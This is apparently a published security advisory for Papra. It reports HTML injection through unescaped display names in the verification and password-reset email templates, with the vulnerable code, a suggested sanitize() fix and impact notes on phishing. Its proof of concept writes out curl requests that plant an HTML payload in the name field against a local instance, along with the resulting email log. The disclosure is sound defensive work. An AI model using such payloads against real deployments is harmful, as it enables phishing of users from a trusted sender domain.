 HTML Injection in Transactional Emails via Unescaped User Display Name
 Moderate
 CorentinTh 
 published
 GHSA-6f8x-2rc9-vgh4 
 Apr 2, 2026 
 Package
 ghcr.io/papra-hq/papra 
 (Docker (ghcr.io))
 Affected versions
 <= 26.3.0
 Patched versions
 26.4.0
 Description
 Summary
 Two transactional email templates in Papra interpolate user.name directly
into HTML without escaping or sanitization. An attacker who registers with
a display name containing HTML tags will have those tags injected into the
verification and password reset email bodies. Since emails are sent from the
legitimate domain (e.g: auth@mail.papra.app ), this enables convincing
phishing attacks that appear to originate from official Papra notifications.
 Details
 Root Cause: auth.emails.services.ts: raw interpolation of user.name 
 Both transactional email templates embed user.name directly into HTML
with no escaping:
 // apps/papra-server/src/modules/app/auth/auth.emails.services.ts 
 // sendVerificationEmail 
 html : ` 
 <p>Hello ${ user . name } ,</p> 
 <p>Verify your email by clicking <a href=" ${ url } ">here</a></p> 
 ` . trim ( ) , 
 // sendPasswordResetEmail — identical pattern 
 html : ` 
 < p > Hello ${ user . name } , </ p > 
 < p > Reset your password by clicking < a href =" ${ url } " > here </ a > </ p > 
 ` . trim ( ) , 
 The fix exists in the codebase but was not applied here 
 The organization invitation email correctly sanitizes user-controlled input:
 // apps/papra-server/src/modules/organizations/organizations.usecases.ts 
 import { sanitize } from '../shared/html/html' ; 
 const organizationName = sanitize ( organization . name ) ; // protected 
 The sanitize() function and sanitize-html package are already a
dependency. The auth email service was simply missed.
 PoC
 Environment: Papra 26.3.0 ( ghcr.io/papra-hq/papra:latest )
 Setup: Self-hosted Docker, default configuration
 Confirmed via: Docker email logger ( EMAILS_DRY_RUN=true )
 Step 1: Register an account with an HTML injection payload as the display name: 
 curl -s -X POST http://localhost:1221/api/auth/sign-up/email \
 -H " Content-Type: application/json " \
 -d ' { 
 "email": "test-injection@example.com", 
 "password": "Password123!", 
 "name": "</p><b style=\"color:red\">INJECTED</b><p>" 
 } ' | jq . 
 Response confirms the raw payload is stored as the user name:
 {
 "token" : " 7X3kNLu3Wi4EFnbAdHo5ubQ2HamKdDyi " ,
 "user" : {
 "name" : " </p><b style= \" color:red \" >INJECTED</b><p> " ,
 "email" : " test-injection@example.com " ,
 "emailVerified" : false ,
 "id" : " usr_knorq46yryw326lxy2q90u43 " 
 }
}
 Step 2: Trigger a password reset email for the injected account: 
 curl -s -X POST http://localhost:1221/api/auth/request-password-reset \
 -H " Content-Type: application/json " \
 -d ' {"email": "test-injection@example.com"} ' | jq . 
 Step 3: Observe the raw HTML payload in the sent email: 
 docker logs papra 2>&1 | grep " Sending email " | grep " test-injection " | python3 -m json.tool
 Actual email logger output: 
 {
 "level" : " info " ,
 "message" : " Sending email " ,
 "timestampMs" : 1774895828018 ,
 "namespace" : " emails.services " ,
 "data" : {
 "to" : " test-injection@example.com " ,
 "subject" : " Reset your password " ,
 "from" : " Papra <auth@mail.papra.app> " ,
 "html" : " <p>Hello </p><b style= \" color:red \" >INJECTED</b><p>,</p> \n <p>Reset your password by clicking <a href= \" ... \" >here</a></p> \n <p>Or by pasting the following link into your browser: ...</p> \n <p style= \" color: #888; \" >Best regards,</p> \n <p style= \" color: #888; \" >The Papra team</p> " 
 }
}
 The injected payload successfully broke out of the <p>Hello ...</p> tag.
The rendered email HTML becomes:
 < p > Hello </ p > 
 < b style =" color:red " > INJECTED </ b > 
 < p > , </ p > 
 < p > Reset your password by clicking < a href =" ... " > here </ a > </ p > 
 Instead of the safe escaped version:
 < p > Hello &lt;/p&gt;&lt;b style=&quot;color:red&quot;&gt;INJECTED&lt;/b&gt;&lt;p&gt;, </ p > 
 The resulting email — sent from auth@mail.papra.app or any validated self hosted domain — would show only
the attacker's fake link with no legitimate reset button visible.
 Expected: user.name escaped as &lt;/p&gt;&lt;b&gt;... 
 Actual: Raw HTML tags injected into email body, breaking document structure
 Impact
 The vulnerability affects any Papra deployment where email is configured.
Both sendVerificationEmail and sendPasswordResetEmail are affected.
 Since emails are sent from the legitimate domains
(e.g: auth@mail.papra.app ), phishing emails crafted using this vulnerability
will pass SPF, DKIM, and DMARC checks and appear completely authentic to
email security filters and recipients.
 Specific attack scenarios include replacing legitimate verification or
reset links with attacker-controlled URLs, injecting fake security warnings
to trick users into visiting malicious sites, and embedding tracking pixels
or external resources to confirm email delivery and user activity.
 The frontend correctly escapes user names when displaying them in the UI.
The vulnerability is isolated to the email templates.
 Suggested Fix
 Apply the existing sanitize() function to user.name before interpolation,
consistent with how organization names are already handled:
 import { sanitize } from '../shared/html/html' ; 
 // sendVerificationEmail 
 html : ` 
 <p>Hello ${ sanitize ( user . name ) } ,</p> 
 <p>Verify your email by clicking <a href=" ${ url } ">here</a></p> 
 ` . trim ( ) , 
 // sendPasswordResetEmail 
 html : ` 
 < p > Hello ${ sanitize ( user . name ) } , </ p > 
 < p > Reset your password by clicking < a href =" ${ url } " > here </ a > </ p > 
 ` . trim ( ) , 
 Alternatively use he or html-escaper for lightweight HTML entity
encoding if full sanitization is not desired.
